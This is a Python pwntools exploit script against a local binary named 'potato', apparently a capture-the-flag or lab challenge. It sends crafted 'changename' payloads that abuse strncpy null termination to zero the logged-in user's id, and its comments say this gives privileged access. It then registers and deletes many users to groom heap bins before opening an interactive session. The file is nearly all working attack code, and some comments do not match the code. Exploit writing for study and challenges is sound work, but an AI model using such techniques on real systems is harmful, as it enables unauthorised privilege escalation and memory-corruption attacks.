#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato")
p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
#break login2.c:14
break func.c:214
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# overwrite user structure with user-chosen id: 0
# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
# since strncpy adds a null terminator at session.logged_in_user->name[54]
p.sendline(b"changename")
payload=b"\x41" * 50 + b"\x42" * 3
p.sendline(payload)

# Repeat the same for session.logged_in_user->name[53]
p.sendline(b"changename")
payload=b"\x41" * 50 + b"\x42" * 2
p.sendline(payload)

# all bytes in session.logged_in_user->id are now zero, we are privileged
# change name back to original
p.sendline(b"changename")
payload=b"peter" + b"\x0a"
p.sendline(payload)

#
# create seven users in a row
#
for i in range(20):
    p.sendline(b"register")
    p.sendline("user_" + repr(i))
    p.sendline(b"p@ssw0rd")


#
# last user
#
p.sendline(b"register")
p.sendline(b"hackedUser")
p.sendline(b"p@ssw0rd")

#
# fill the bins with free'd mem
#
for i in range(10):
    p.sendline(b"delete")
    p.sendline(repr(7 + i))

p.sendline("list")

p.sendline(payload)
p.interactive()
